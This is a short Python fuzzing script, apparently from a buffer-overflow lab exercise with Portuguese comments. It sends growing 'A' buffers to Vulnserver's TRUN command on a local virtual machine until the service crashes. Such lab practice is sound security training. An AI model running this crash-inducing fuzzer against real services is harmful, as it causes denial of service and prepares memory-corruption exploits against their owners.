import socket
import sys
import time

# IP da sua máquina virtual onde o Vulnserver está rodando
alvo = "192.168.1.50" 
porta = 9999

# O Vulnserver tem um comando vulnerável chamado "TRUN"
# Vamos começar enviando 100 "A"s e aumentar de 100 em 100
tamanho = 100
buffer = b"TRUN ." + b"A" * tamanho

while True:
    try:
        print(f"[+] Testando com {tamanho} bytes...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((alvo, porta))
        
        s.send(buffer)
        s.recv(1024)
        s.close()
        
        # Aumenta o tamanho para o próximo teste
        tamanho += 100
        buffer = b"TRUN ." + b"A" * tamanho
        time.sleep(1)
        
    except:
        print(f"[!] O programa travou por volta de {tamanho} bytes!")
        sys.exit()
